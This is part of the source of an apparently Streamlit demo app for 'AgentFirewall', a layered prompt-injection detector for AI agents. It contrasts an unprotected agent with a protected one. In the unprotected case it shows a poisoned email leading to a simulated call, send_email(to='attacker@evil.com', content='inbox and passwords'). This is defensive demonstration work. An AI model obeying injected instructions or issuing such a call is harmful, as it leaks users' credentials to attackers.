  font-weight: 700;
  color: #E8ECF8;
}

.status-pill-checked {
  background: #163B48;
  color: #22D3EE;
  font-size: 14px !important;
  font-weight: 700 !important;
  padding: 4px 12px;
  border-radius: 20px;
  border: 1px solid rgba(34, 211, 238, 0.4);
}

.status-pill-skipped {
  background: #1F2942;
  color: #E8ECF8;
  font-size: 14px !important;
  font-weight: 700 !important;
  padding: 4px 12px;
  border-radius: 20px;
  border: 1px solid #263261;
}

.status-pill-offline {
  background: #33260A;
  color: #F59E0B;
  font-size: 14px !important;
  font-weight: 700 !important;
  padding: 4px 12px;
  border-radius: 20px;
  border: 1px solid rgba(245, 158, 11, 0.4);
}

.layer-desc-text {
  font-size: 15px !important;
  line-height: 1.5;
  color: #A9B3D1;
  margin-bottom: 16px;
  min-height: 48px;
}

.layer-meta-text {
  font-size: 15px !important;
  color: #A9B3D1;
  margin-bottom: 8px;
}

.layer-sub-text {
  font-size: 15px !important;
  color: #A9B3D1;
  margin-top: 10px;
}

.chip-tag {
  display: inline-block;
  background: #300E12;
  color: #F87171;
  border: 1px solid #EF4444;
  border-radius: 6px;
  padding: 4px 10px;
  font-size: 14px !important;
  font-weight: 700 !important;
  margin: 4px 4px 4px 0;
}

.layer-card-progress-track {
  width: 100%;
  height: 8px;
  background: #121A33;
  border: 1px solid #263261;
  border-radius: 4px;
  overflow: hidden;
  margin-top: 14px;
}

.layer-card-progress-fill {
  height: 100%;
  background: linear-gradient(90deg, #22D3EE, #6366F1);
  border-radius: 4px;
  transition: width 0.3s ease;
}

/* Example Cards: Equal Height by Construction */
div[data-testid="column"] div[data-testid="stVerticalBlockBorderWrapper"]:has(.ex-card-selected) {
  border-color: #22D3EE !important;
  box-shadow: 0 0 16px rgba(34, 211, 238, 0.35) !important;
}

.ex-card-tag-row {
  height: 28px;
  line-height: 28px;
  margin-bottom: 8px;
}

.ex-card-content {
  display: flex;
  flex-direction: column;
  flex: 1 1 auto;
}

.ex-card-content.ex-card-selected {
  outline: 2px solid #22D3EE;
  outline-offset: 4px;
  border-radius: 8px;
}

.ex-card-box {
  padding: 20px;
  background: #172042;
  border: 1px solid #263261;
  border-radius: 16px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  flex: 1 1 auto;
  min-height: 175px;
  margin-bottom: 12px;
  transition: transform 0.15s ease, border-color 0.15s ease;
  width: 100%;
}

.ex-card-box:hover {
  transform: translateY(-2px);
  border-color: #22D3EE;
}

div[data-testid="column"]:has(.ex-card-box) div[data-testid="stButton"] {
  margin-top: auto !important;
  width: 100% !important;
}

div[data-testid="column"]:has(.ex-card-box) div[data-testid="stButton"] button {
  width: 100% !important;
  font-size: 15px !important;
}

.ex-pill-attack {
  display: inline-block;
  background: #300E12;
  color: #F87171;
  border: 1px solid #EF4444;
  font-size: 14px !important;
  font-weight: 700 !important;
  padding: 4px 10px;
  border-radius: 6px;
  letter-spacing: 0.5px;
  text-transform: uppercase;
}

.ex-pill-normal {
  display: inline-block;
  background: #0F2E1D;
  color: #22C55E;
  border: 1px solid #22C55E;
  font-size: 14px !important;
  font-weight: 700 !important;
  padding: 4px 10px;
  border-radius: 6px;
  letter-spacing: 0.5px;
  text-transform: uppercase;
}

.ex-card-title {
  font-size: 18px !important;
  font-weight: 700;
  color: #E8ECF8;
  margin: 0 0 6px 0;
  line-height: 24px;
  height: 48px;
  display: -webkit-box;
  -webkit-line-clamp: 2;
  -webkit-box-orient: vertical;
  overflow: hidden;
}

.ex-card-desc {
  font-size: 14px !important;
  line-height: 20px;
  color: #A9B3D1;
  margin: 0 0 12px 0;
  height: 60px;
  display: -webkit-box;
  -webkit-line-clamp: 3;
  -webkit-box-orient: vertical;
  overflow: hidden;
}

/* Callout & Alert Boxes: 16px Radius, 16px Text */
.callout-amber {
  padding: 20px 24px;
  background: #33260A;
  border: 1px solid #F59E0B;
  border-radius: 16px;
  color: #E8ECF8;
  margin: 20px 0;
  font-size: 16px !important;
  line-height: 1.55;
}

.callout-amber strong {
  color: #F59E0B;
}

.callout-info {
  padding: 20px 24px;
  background: #172042;
  border: 1px solid #22D3EE;
  border-radius: 16px;
  color: #E8ECF8;
  margin: 20px 0;
  font-size: 16px !important;
  line-height: 1.55;
}

.callout-info strong {
  color: #22D3EE;
}

.alert-box-block {
  background: #300E12;
  border: 1px solid #EF4444;
  border-radius: 16px;
  padding: 18px 24px;
  color: #F87171;
  font-weight: 600;
  font-size: 16px !important;
  line-height: 1.5;
}

.alert-box-allow {
  background: #0F2E1D;
  border: 1px solid #22C55E;
  border-radius: 16px;
  padding: 18px 24px;
  color: #22C55E;
  font-weight: 600;
  font-size: 16px !important;
  line-height: 1.5;
}

.status-banner-allow {
  background: #0F2E1D;
  border: 1px solid #22C55E;
  border-radius: 16px;
  padding: 14px 20px;
  color: #22C55E;
  font-weight: 600;
  font-size: 15px !important;
  margin-bottom: 12px;
}

/* 3x3 Policy Matrix */
.matrix-table {
  width: 100%;
  border-collapse: collapse;
  margin: 20px 0;
  font-size: 15px !important;
}

.matrix-table th, .matrix-table td {
  border: 1px solid #263261;
  padding: 12px 16px;
  text-align: center;
}

.matrix-table th {
  background: #121A33;
  color: #E8ECF8;
  font-weight: 700;
  font-size: 16px !important;
}

.matrix-cell-allow {
  background: #0F2E1D;
  color: #22C55E;
  font-weight: 700;
}

.matrix-cell-ask {
  background: #33260A;
  color: #F59E0B;
  font-weight: 700;
}

.matrix-cell-block {
  background: #300E12;
  color: #F87171;
  font-weight: 700;
}

/* Site Footer: 3 Columns, 15px text, 20px titles, clear spacing */
.site-footer {
  margin-top: 48px;
  padding-top: 32px;
  border-top: 1px solid #263261;
  background: #0B1020;
  width: 100%;
}

.footer-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: 32px;
  margin-bottom: 32px;
  width: 100%;
}

.footer-col {
  width: 100%;
}

.footer-brand-name {
  font-weight: 700;
  font-size: 20px !important;
  color: #E8ECF8;
}

.footer-col-title {
  font-size: 20px !important;
  font-weight: 700;
  color: #E8ECF8;
  margin-bottom: 16px;
}

.footer-text {
  font-size: 15px !important;
  line-height: 1.6;
  color: #A9B3D1;
  margin: 8px 0;
}

.footer-links-list {
  list-style: none;
  padding: 0;
  margin: 0;
}

.footer-links-list li {
  margin-bottom: 8px;
}

.footer-links-list a {
  color: #A9B3D1 !important;
  text-decoration: none !important;
  font-size: 15px !important;
  transition: color 0.15s ease-in-out;
}

.footer-links-list a:hover, .footer-links-list a:focus {
  color: #22D3EE !important;
  text-decoration: underline !important;
}

.footer-bottom-bar {
  padding-top: 20px;
  border-top: 1px solid #172042;
  text-align: center;
  font-size: 15px !important;
  color: #A9B3D1;
  line-height: 1.6;
}

/* Tabs: 17px, Clearly Active State with Cyan Underline */
div[data-testid="stTabs"] [data-baseweb="tab-list"] {
  background-color: transparent !important;
  border-bottom: 2px solid #263261 !important;
  border-radius: 0 !important;
  padding: 0 !important;
  gap: 32px !important;
  margin-bottom: 24px !important;
}

button[data-baseweb="tab"] {
  color: #A9B3D1 !important;
  font-size: 17px !important;
  font-weight: 600 !important;
  background-color: transparent !important;
  border: none !important;
  border-bottom: 2px solid transparent !important;
  border-radius: 0 !important;
  padding: 12px 4px !important;
  margin-bottom: -2px !important;
  transition: color 0.15s ease, border-color 0.15s ease !important;
}

button[data-baseweb="tab"]:hover {
  color: #E8ECF8 !important;
  background-color: transparent !important;
}

button[data-baseweb="tab"][aria-selected="true"] {
  color: #22D3EE !important;
  background-color: transparent !important;
  font-weight: 700 !important;
  border-bottom: 2px solid #22D3EE !important;
}

/* Expander Consistency */
div[data-testid="stExpander"] {
  background-color: #172042 !important;
  border: 1px solid #263261 !important;
  border-radius: 16px !important;
}

div[data-testid="stExpander"] details summary {
  background-color: #121A33 !important;
  color: #E8ECF8 !important;
  font-size: 16px !important;
}

/* Tablet Media Query (769px to 1024px) */
@media (min-width: 769px) and (max-width: 1024px) {
  div[data-testid="stHorizontalBlock"]:has(.ex-card-box) {
    display: grid !important;
    grid-template-columns: repeat(2, 1fr) !important;
    gap: 16px !important;
  }
  div[data-testid="stHorizontalBlock"]:has(.ex-card-box) > div[data-testid="column"] {
    width: 100% !important;
    min-width: 0 !important;
    flex: 1 1 auto !important;
  }
}

/* Mobile Media Query (<= 768px): Stacks, Nothing Below 14px, Body 16px */
@media (max-width: 768px) {
  html, body, [class*="st-"], .stApp {
    font-size: 16px !important;
  }
  .top-nav-bar {
    height: auto;
    min-height: 60px;
    padding: 8px 16px;
    flex-wrap: wrap;
    gap: 8px;
  }
  .nav-links-cluster {
    order: 3;
    width: 100%;
    display: flex;
    overflow-x: auto;
    -webkit-overflow-scrolling: touch;
    white-space: nowrap;
    gap: 16px;
    padding-bottom: 4px;
    scrollbar-width: none;
  }
  .nav-links-cluster::-webkit-scrollbar {
    display: none;
  }
  .header-right-action {
    order: 2;
  }
  .main .block-container,
  div[data-testid="stAppViewBlockContainer"],
  .block-container {
    padding-top: 110px !important;
    padding-left: 16px !important;
    padding-right: 16px !important;
  }
  .hero-grid {
    grid-template-columns: 1fr;
    gap: 24px;
  }
  div[data-testid="stHorizontalBlock"] {
    display: flex !important;
    flex-direction: column !important;
    gap: 16px !important;
  }
  div[data-testid="column"] {
    width: 100% !important;
    min-width: 100% !important;
    flex: 1 1 100% !important;
  }
  .hero-btn-row {
    flex-direction: column;
    align-items: stretch;
  }
  .hero-cta-btn {
    justify-content: center;
    width: 100%;
  }
}
</style>
"""
st.markdown(CSS_STYLING, unsafe_allow_html=True)

# ---------------------------------------------------------------------------
# FIXED HEADER BAR & IN-PAGE NAV SCRIPT
# ---------------------------------------------------------------------------
if LIVE["docs"]:
    docs_nav_item = f'<a href="{LINKS["docs"]}" target="_blank" rel="noopener noreferrer" class="nav-link-item">Docs</a>'
    hero_docs_btn = f'<a href="{LINKS["docs"]}" target="_blank" rel="noopener noreferrer" class="hero-cta-btn hero-cta-secondary">Read the docs &rarr;</a>'
else:
    docs_nav_item = '<span class="nav-link-item nav-link-disabled" title="Documentation site deploying soon">Docs <span class="nav-soon-pill">Soon</span></span>'
    hero_docs_btn = '<span class="hero-cta-btn hero-cta-secondary nav-link-disabled">Read the docs (Coming Soon)</span>'

if LIVE["github"]:
    header_gh_btn = f'<a href="{LINKS["github_repo"]}" target="_blank" rel="noopener noreferrer" class="nav-github-btn">GitHub</a>'
else:
    header_gh_btn = '<span class="nav-github-btn nav-link-disabled">GitHub</span>'

st.markdown(
    f"""
<header class="top-nav-bar">
  <div class="brand-wrapper">
    {LOGO_SVG}
    <span class="brand-wordmark"><span class="brand-gradient-text">AgentFirewall</span></span>
  </div>
  <nav class="nav-links-cluster" aria-label="Main Navigation">
    <a href="#live-demo" target="_self" class="nav-link-item">Live Demo</a>
    <a href="#who-its-for" target="_self" class="nav-link-item">Who It's For</a>
    <a href="#scan-your-own-text" target="_self" class="nav-link-item">Scan Your Own Text</a>
    <a href="#how-it-works" target="_self" class="nav-link-item">How It Works</a>
    <a href="#why-layers" target="_self" class="nav-link-item">Why Layers?</a>
    <a href="#benchmarks" target="_self" class="nav-link-item">Benchmarks</a>
    {docs_nav_item}
  </nav>
  <div class="header-right-action">
    {header_gh_btn}
  </div>
</header>
""",
    unsafe_allow_html=True,
)

# ---------------------------------------------------------------------------
# HERO SECTION (Two-Column on Wide Screens: Left = Content, Right = Inline SVG)
# ---------------------------------------------------------------------------
stats_data = load_benchmark_results()

st.markdown(
    f"""
<div class="hero-container">
  <div class="hero-grid">
    <div class="hero-left-col">
      <h1 class="hero-headline"><span class="brand-gradient-text">AgentFirewall</span></h1>
      <div class="hero-tagline">{BRAND_TAGLINE}</div>
      <p class="hero-body-text">
        AI assistants read emails, documents, and web pages. Attackers hide commands inside them to hijack actions like forwarding passwords or data. AgentFirewall checks every action before execution to keep agents safe.
      </p>
      <div class="hero-btn-row">
        <a href="#live-demo" target="_self" class="hero-cta-btn hero-cta-primary">Try the live demo &darr;</a>
        {hero_docs_btn}
      </div>
      <div class="hero-chips-row">
        <div class="hero-stat-chip"><strong>{stats_data.get('rules_classifier_catch', '83.9%')}</strong> attacks caught</div>
        <div class="hero-stat-chip"><strong>{stats_data.get('rules_classifier_fp', '5.1%')}</strong> false alarms</div>
        <div class="hero-stat-chip"><strong>{stats_data.get('sample_count', 115)}</strong> benchmark samples</div>
      </div>
    </div>
    <div class="hero-right-col">
      {HERO_ILLUSTRATION_SVG}
    </div>
  </div>
</div>
""",
    unsafe_allow_html=True,
)

# ---------------------------------------------------------------------------
# SMOOTH SCROLLING & ACTIVE SECTION OBSERVER SCRIPT
# ---------------------------------------------------------------------------
NAV_SCROLL_SCRIPT = """
<script>
(function() {
  function initNavScroll() {
    var pDoc = window.parent.document;
    if (!pDoc) return;

    var navLinks = pDoc.querySelectorAll('a[href^="#"]');
    navLinks.forEach(function(link) {
      if (link.getAttribute('data-scroll-bound') === 'true') return;
      link.setAttribute('data-scroll-bound', 'true');
      link.addEventListener('click', function(ev) {
        var href = link.getAttribute('href');
        if (!href || href === '#') return;
        var targetId = href.substring(1);
        var targetEl = pDoc.getElementById(targetId);
        if (targetEl) {
          ev.preventDefault();
          targetEl.scrollIntoView({ behavior: 'smooth', block: 'start' });
          try {
            if (window.parent.history && window.parent.history.pushState) {
              window.parent.history.pushState(null, '', '#' + targetId);
            }
          } catch(e) {}
          navLinks.forEach(function(l) { l.classList.remove('active'); });
          link.classList.add('active');
        }
      });
    });

    var sectionIds = ['live-demo', 'who-its-for', 'scan-your-own-text', 'how-it-works', 'why-layers', 'benchmarks'];
    var sections = sectionIds.map(function(id) { return pDoc.getElementById(id); }).filter(Boolean);

    function onScroll() {
      var currentId = '';
      for (var i = sections.length - 1; i >= 0; i--) {
        var sec = sections[i];
        var rect = sec.getBoundingClientRect();
        if (rect.top <= 160) {
          currentId = sec.id;
          break;
        }
      }
      if (!currentId && sections.length > 0) {
        currentId = sections[0].id;
      }
      navLinks.forEach(function(l) {
        var href = l.getAttribute('href');
        if (href === '#' + currentId) {
          l.classList.add('active');
        } else {
          l.classList.remove('active');
        }
      });
    }

    try {
      window.parent.removeEventListener('scroll', onScroll);
      window.parent.addEventListener('scroll', onScroll, { passive: true });
      onScroll();
    } catch(e) {}
  }

  var count = 0;
  var timer = setInterval(function() {
    count++;
    initNavScroll();
    if (count > 25) clearInterval(timer);
  }, 200);
})();
</script>
"""
components.html(NAV_SCROLL_SCRIPT, height=0, width=0)

# Check Ollama Availability (Cached 1s once per session)
ollama_available = check_ollama_reachable()
query_demo = st.query_params.get("demo", "")

# ---------------------------------------------------------------------------
# SECTION 1: LIVE DEMO (Unprotected vs Protected Story Comparison)
# ---------------------------------------------------------------------------
st.markdown('<h2 id="live-demo" class="section-heading">Live Demo</h2>', unsafe_allow_html=True)
st.markdown(
    "Compare what happens when an AI assistant receives an email containing a hidden injection attack."
)

story_choice = st.radio(
    "Select simulated incoming email:",
    ["Poisoned Email (contains hidden injection)", "Normal Email (benign workplace note)"],
    index=1 if query_demo == "normal" else 0,
    horizontal=True,
    key="story_radio",
)

active_email = POISONED_EMAIL if "Poisoned" in story_choice else NORMAL_EMAIL
is_attack = "Poisoned" in story_choice

st.text_area(
    "Incoming simulated email text:",
    value=active_email,
    height=120,
    disabled=True,
    key="story_preview",
)

col_unprot, col_prot = st.columns(2)

with col_unprot:
    st.markdown("### ❌ Unprotected Agent")
    st.caption("Standard agent with no firewall: parses and obeys text blindly.")

    if is_attack:
        st.error("🚨 **Unauthorized Action Extracted:**")
        st.code("send_email(to='attacker@evil.com', content='inbox and passwords')", language="python")
        st.markdown(
            """
            <div class="alert-box-block">
              💥 DATA LEAKED: The AI obeyed the attacker's hidden HTML instruction and sent confidential credentials!
            </div>
            """,
            unsafe_allow_html=True,
        )
    else:
        st.success("✅ **Standard Action Executed:**")
        st.code("save_note(title='Lunch Invitation', content='Bob at 12:30')", language="python")
        st.markdown(
            """
            <div class="alert-box-allow">
              Normal workplace workflow completed safely without disruption.
            </div>
            """,
            unsafe_allow_html=True,
        )

with col_prot:
    st.markdown("### 🛡️ Protected Agent (AgentFirewall)")
    st.caption("Risk-aware firewall: scans input before any tool is invoked.")

    cascade_obj = get_cascade(
        judge_name="ollama" if ollama_available else "precomputed",
        combine="gated",
        with_clf=True,
        profile="balanced",
        is_live_ollama=ollama_available,
    )
    res = cascade_obj.evaluate(active_email)
    pol = Policy(profile="balanced")

    if is_attack:
        dec = pol.decide(res.suspicion, RiskLevel.HIGH)
        verdict_text = generate_verdict_sentence(
            decision=dec,
            suspicion=res.suspicion,
            risk=RiskLevel.HIGH,
            tool_name="send_email",
            rule_hits=res.layers[0].hits if res.layers else None,
        )
        st.markdown(
            f"""
            <div class="verdict-banner-box verdict-banner-block">
              <div class="verdict-title-block">🛑 {dec.value}: TOOL EXECUTION HALTED</div>
              <p class="verdict-body-text">{verdict_text}</p>
            </div>
            """,
            unsafe_allow_html=True,
        )
        st.markdown(
            """
            <div class="status-banner-allow">
              🔒 SAFE: The agent refused to send the email. Sensitive credentials stayed private.
            </div>
            """,
            unsafe_allow_html=True,
        )
        if res.layers and res.layers[0].hits:
            st.markdown("**Rules that intercepted the command:**")
            chips_html = "".join([
                f"<span class='chip-tag'>{get_friendly_rule_label(hit)}</span>"
                for hit in res.layers[0].hits
            ])
            st.markdown(chips_html, unsafe_allow_html=True)
    else:
        dec = pol.decide(res.suspicion, RiskLevel.MEDIUM)
        verdict_text = generate_verdict_sentence(
            decision=dec,
            suspicion=res.suspicion,
            risk=RiskLevel.MEDIUM,
            tool_name="save_note",
        )
        st.markdown(
            f"""
            <div class="verdict-banner-box verdict-banner-allow">
              <div class="verdict-title-allow">✅ {dec.value}: SAFE TO PROCEED</div>
              <p class="verdict-body-text">{verdict_text}</p>
            </div>
            """,
            unsafe_allow_html=True,
        )
        st.markdown(
            """
            <div class="status-banner-allow">
              Safe business action completed seamlessly without prompt injection interruption.
            </div>
            """,
            unsafe_allow_html=True,
        )

# ---------------------------------------------------------------------------
# WHO IT'S FOR
# ---------------------------------------------------------------------------
st.markdown("---")
st.markdown("""<h2 id="who-its-for" class="section-heading">Who It's For</h2>""", unsafe_allow_html=True)
st.markdown(
    """
<div class="strip-container">
  <div class="strip-card">
    <div class="strip-card-top">
      <span class="strip-title">Agent Developers</span>
    </div>
    <p class="strip-desc">Build safe AI agents with a single line of defense.</p>
  </div>
  <div class="strip-card">
    <div class="strip-card-top">
      <span class="strip-title">Security Engineers</span>
    </div>
    <p class="strip-desc">Calibrated thresholds, explainable decisions, zero external calls by default.</p>
  </div>
  <div class="strip-card">
    <div class="strip-card-top">
      <span class="strip-title">Researchers</span>
    </div>
    <p class="strip-desc">Reproducible benchmark with 10 attack classes and full ablation data.</p>
  </div>
</div>
""",
    unsafe_allow_html=True,
)

# ---------------------------------------------------------------------------
# SECTION 2: SCAN YOUR OWN TEXT (Interactive Scanner)
# ---------------------------------------------------------------------------
st.markdown("---")
st.markdown('<h2 id="scan-your-own-text" class="section-heading">Scan Your Own Text</h2>', unsafe_allow_html=True)

if "scanner_input" not in st.session_state:
    st.session_state["scanner_input"] = POISONED_EMAIL
    st.session_state["main_text_area"] = POISONED_EMAIL
    st.session_state["selected_example_id"] = "hijacked"
    st.session_state["selected_example_tag"] = "attack"


def _select_example(
    text: str,
    ex_id: str,
    tag: Optional[str] = None,
    risk: RiskLevel = RiskLevel.HIGH,
    tool_name: str = "send email",
) -> None:
    st.session_state["scanner_input"] = text
    st.session_state["main_text_area"] = text
    st.session_state["selected_example_id"] = ex_id
    st.session_state["selected_example_tag"] = tag
    st.session_state["selected_example_risk"] = risk
    st.session_state["selected_example_tool"] = tool_name
    st.session_state["custom_scan_result"] = None


def _clear_custom_input() -> None:
    st.session_state["scanner_input"] = ""
    st.session_state["main_text_area"] = ""
    st.session_state["selected_example_id"] = None
    st.session_state["selected_example_tag"] = None
    st.session_state["selected_example_risk"] = None
    st.session_state["selected_example_tool"] = None
    st.session_state["custom_scan_result"] = None


def render_result_panel(
    text: str,
    risk: RiskLevel = RiskLevel.HIGH,
    tool_name: str = "send email",
    benchmark_tag: Optional[str] = None,
    example_id: Optional[str] = None,
    example_risk: Optional[RiskLevel] = None,
    cascade_engine: Optional[Any] = None,
    profile: str = "balanced",
    is_live_ollama: bool = False,
    trace: Optional[Trace] = None,
) -> Any:
    cascade_engine = cascade_engine or get_cascade(profile=profile)

    if trace is None:
        judge_mode = "live" if is_live_ollama else "precomputed"
        trace = scan(
            text=text,
            tool_risk=risk,
            profile=profile,
            judge_mode=judge_mode,
            cascade=cascade_engine,
            precomputed_map=_PRECOMPUTED_MAP,
        )

    decision = trace.decision
    suspicion = trace.combined_suspicion
    rule_hits = trace.rules_hits
    judge_reason = trace.judge_reasoning

    gt_badge = ""
    if benchmark_tag:
        tag_norm = benchmark_tag.lower()
        bench_risk = example_risk or RiskLevel.HIGH
        bench_decision = Policy(profile="balanced").decide(suspicion, bench_risk)
        if tag_norm in ("attack", "hijacked"):
            if bench_decision in (Decision.BLOCK, Decision.ASK):
                gt_badge = '<span style="background:#0F2E1D; color:#22C55E; border:1px solid #22C55E; padding:3px 10px; border-radius:6px; font-weight:700; font-size:14px; margin-left:12px; letter-spacing:0.5px;">✓ CORRECT</span>'
            else:
                gt_badge = '<span style="background:#300E12; color:#F87171; border:1px solid #EF4444; padding:3px 10px; border-radius:6px; font-weight:700; font-size:14px; margin-left:12px; letter-spacing:0.5px;">✗ MISSED ATTACK</span>'
        elif tag_norm in ("normal", "safe"):
            if bench_decision == Decision.ALLOW:
                gt_badge = '<span style="background:#0F2E1D; color:#22C55E; border:1px solid #22C55E; padding:3px 10px; border-radius:6px; font-weight:700; font-size:14px; margin-left:12px; letter-spacing:0.5px;">✓ CORRECT</span>'
            else:
                gt_badge = '<span style="background:#33260A; color:#F59E0B; border:1px solid #F59E0B; padding:3px 10px; border-radius:6px; font-weight:700; font-size:14px; margin-left:12px; letter-spacing:0.5px;">⚠ FALSE ALARM</span>'

    sentence = generate_verdict_sentence(
        decision=decision,
        suspicion=suspicion,
        risk=risk,
        tool_name=tool_name,
        rule_hits=rule_hits,
        judge_reason=judge_reason,
    )

    if decision == Decision.BLOCK:
        b_class, t_class, v_icon, v_head = "verdict-banner-block", "verdict-title-block", "🛑", "BLOCKED"
    elif decision == Decision.ASK:
        b_class, t_class, v_icon, v_head = "verdict-banner-ask", "verdict-title-ask", "⚠️", "ASK THE USER"
    else:
        b_class, t_class, v_icon, v_head = "verdict-banner-allow", "verdict-title-allow", "✅", "ALLOWED"

    st.markdown(
        f"""
        <div class="verdict-banner-box {b_class}">
          <div class="{t_class}">{v_icon} {v_head}{gt_badge}</div>
          <p class="verdict-body-text">{sentence}</p>
        </div>
        """,
        unsafe_allow_html=True,
    )

    score_pct = int(round(suspicion * 100))
    total_lat = trace.rules_latency_ms + trace.classifier_latency_ms + trace.judge_latency_ms
    st.caption(f"Final Suspicion Score: **{score_pct}%** ({suspicion:.4f}) | Total Scan Latency: **{total_lat:.1f} ms**")
    st.progress(suspicion)

    if example_id:
        hn = get_honest_note(example_id, trace.rules_score, trace.classifier_score, trace.judge_score)
        if hn:
            st.markdown(f'<div class="callout-amber"><strong>Honest Divergence Note:</strong> {hn}</div>', unsafe_allow_html=True)

    # Three Layers Cards
    rules_pct = int(round(trace.rules_score * 100))
    rules_time = f"{trace.rules_latency_ms:.1f} ms" if trace.rules_latency_ms > 0 else "<1 ms"
    chips_html = "".join([f"<span class='chip-tag'>{h}</span>" for h in trace.rules_hits]) or "<span class='layer-meta-text'>No pattern matches</span>"

    if trace.classifier_score is not None:
        clf_pct = int(round(trace.classifier_score * 100))
        clf_time = f"{trace.classifier_latency_ms:.1f} ms" if trace.classifier_latency_ms > 0 else "—"
        c_pill = "<span class='status-pill-checked'>Checked</span>"
        c_note = f"Score: <strong style='color:#22D3EE;'>{clf_pct}%</strong> | Latency: <strong>{clf_time}</strong>"
    elif trace.rules_score >= 0.90:
        clf_pct = 0
        c_pill = "<span class='status-pill-skipped'>Skipped because an earlier layer was sure</span>"
        c_note = "Skipped: Layer 1 was decisive (score &ge; 0.90)."
    else:
        clf_pct = 0
        c_pill = "<span class='status-pill-offline'>Not run in this demo</span>"
        c_note = "Layer disabled."

    text_key = hashlib.sha256(text.strip().encode("utf-8")).hexdigest()[:16]
    is_bench_match = text_key in _PRECOMPUTED_MAP

    if is_bench_match and trace.judge_status == "precomputed" and trace.judge_score is not None:
        judge_pct = int(round(trace.judge_score * 100))
        j_pill = "<span class='status-pill-checked' style='background:#172042; color:#22D3EE; border-color:#22D3EE;'>Precomputed</span>"
        j_note = f"Precomputed verdict | Score: <strong style='color:#22D3EE;'>{judge_pct}%</strong><br><span style='color:#A9B3D1; font-style:italic;'>Reason: {trace.judge_reasoning or ''}</span>"
    elif is_bench_match and "skipped" in trace.judge_status:
        judge_pct = int(round((trace.judge_score or 0.0) * 100))
        j_pill = "<span class='status-pill-skipped'>Skipped because an earlier layer was sure</span>"
        cached_info = f" | Cached judge ({judge_pct}%): {trace.judge_reasoning}" if trace.judge_reasoning else ""
        j_note = f"Skipped because an earlier layer was sure{cached_info}"
    elif is_live_ollama and trace.judge_status == "live" and trace.judge_score is not None:
        judge_pct = int(round(trace.judge_score * 100))
        judge_time = f"{trace.judge_latency_ms / 1000:.1f} s" if trace.judge_latency_ms > 0 else "—"
        j_pill = "<span class='status-pill-checked'>Checked</span>"
        j_note = f"Live Ollama | Score: <strong style='color:#22D3EE;'>{judge_pct}%</strong> | Latency: <strong>{judge_time}</strong><br><span style='color:#A9B3D1; font-style:italic;'>Reason: {trace.judge_reasoning or ''}</span>"
    else:
        j_pill = "<span class='status-pill-offline'>Not run in this demo</span>"
        j_note = "Not run in this demo"
        judge_pct = 0

    st.markdown(
        f"""
        <div class="layer-cards-grid">
          <div class="layer-card-container">
            <div>
              <div class="layer-card-header">
                <div class="layer-card-title-wrap">{ICON_RULES_SVG} Layer 1: Rules</div>
                <span class="status-pill-checked">Checked</span>
              </div>
              <div class="layer-desc-text">Instantly scans for known attack patterns, hidden HTML comments, and base64 payloads.</div>
              <div class="layer-meta-text">Score: <strong style="color:#22D3EE;">{rules_pct}%</strong> | Latency: <strong>{rules_time}</strong></div>
            </div>
            <div style="margin-top:8px;">{chips_html}</div>
            <div class="layer-card-progress-track"><div class="layer-card-progress-fill" style="width: {rules_pct}%;"></div></div>
          </div>
          <div class="layer-card-container">
            <div>
              <div class="layer-card-header">
                <div class="layer-card-title-wrap">{ICON_CLASSIFIER_SVG} Layer 2: ML Classifier</div>
                {c_pill}
              </div>
              <div class="layer-desc-text">Statistical model trained on attack grammar to catch rephrased or multilingual variants.</div>
              <div class="layer-meta-text">{c_note}</div>
            </div>
            <div class="layer-sub-text">Calibrated Logistic Regression</div>
            <div class="layer-card-progress-track"><div class="layer-card-progress-fill" style="width: {clf_pct}%;"></div></div>
          </div>
          <div class="layer-card-container">
            <div>
              <div class="layer-card-header">
                <div class="layer-card-title-wrap">{ICON_JUDGE_SVG} Layer 3: AI Judge</div>
                {j_pill}
              </div>
              <div class="layer-desc-text">Deep reasoning LLM invoked only in the uncertain score band [0.35, 0.75] to save cost.</div>
              <div class="layer-meta-text">{j_note}</div>
            </div>
            <div class="layer-sub-text">Ollama llama3.2:3b / Prompt v2</div>
            <div class="layer-card-progress-track"><div class="layer-card-progress-fill" style="width: {judge_pct}%;"></div></div>
          </div>
        </div>
        """,
        unsafe_allow_html=True,
    )

    st.markdown("**Same text, different action risk:**")
    all_dec = trace.decision_by_risk
    dc1, dc2, dc3 = st.columns(3)
    for col, r_lvl in zip([dc1, dc2, dc3], RiskLevel):
        d_val = all_dec[r_lvl]
        with col:
            st.markdown(f"**{r_lvl.value.upper()} RISK TOOL**")
            if r_lvl == RiskLevel.LOW:
                st.caption("E.g. read email, web search")
            elif r_lvl == RiskLevel.MEDIUM:
                st.caption("E.g. save note, draft reply")
            else:
                st.caption("E.g. send email, payment")

            if d_val == Decision.ALLOW:
                st.success(f"**{d_val.value}** — Proceed safely")
            elif d_val == Decision.ASK:
                st.warning(f"**{d_val.value}** — Confirm with user")
            else:
                st.error(f"**{d_val.value}** — Block immediately")

    # Policy Thresholds & Decision Details Expander
    with st.expander("Policy Thresholds & Decision Details", expanded=False):
        st.markdown(f"**Active Profile:** `{profile.capitalize()}` — {PROFILE_HELP.get(profile, 'Calibrated thresholds')}")
        pol_obj = Policy(profile=profile)
        table_rows = []
        for r in RiskLevel:
            t = pol_obj.thresholds[r]
            ask_val = f"≥ {int(round(t.ask * 100))}% ({t.ask:.2f})" if t.ask is not None else "— (direct block)"
            table_rows.append({
                "Risk Level": r.value.capitalize(),
                "Ask Threshold": ask_val,
                "Block Threshold": f"≥ {int(round(t.block * 100))}% ({t.block:.2f})",
                "Verdict for This Input": trace.decision_by_risk[r].value,
            })
        st.table(table_rows)

    # JSON Download
    import json
    trace_json = json.dumps(trace.to_dict(), indent=2)
    st.download_button(
        label="Download Scan Trace (JSON)",
        data=trace_json,
        file_name="firewall_scan_trace.json",
        mime="application/json",
        key=f"dl_trace_{hashlib.sha256(text.encode('utf-8')).hexdigest()[:12]}",
        icon=":material/download:",
    )

    return cascade_engine.evaluate(text)


adv_judge = st.session_state.get("adv_judge_select", "precomputed")
adv_combine = st.session_state.get("adv_combine_select", "gated")
adv_profile = st.session_state.get("adv_profile_select", "balanced")
adv_clf = st.session_state.get("adv_clf_enable", True)

cascade_engine = get_cascade(
    judge_name="ollama" if (ollama_available and adv_judge == "ollama (live)") else adv_judge,
    combine=adv_combine,
    with_clf=adv_clf,
    profile=adv_profile,
    is_live_ollama=ollama_available,
)

# Sub-part: Try an Example
